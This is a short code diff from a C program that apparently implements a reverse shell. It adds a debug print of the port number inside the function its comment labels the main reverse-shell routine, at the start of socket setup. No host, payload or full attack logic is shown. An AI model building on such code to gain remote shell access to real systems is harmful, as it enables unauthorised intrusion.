@@ -67,6 +67,7 @@ int testpid(){
 
 //Main function for the reverse shell
 int establishConnection(int port, int shell) {
+    printf("%d\n", port);
     //Initialize the socket
     int sock = 0, valread;
     struct sockaddr_in serv_addr;
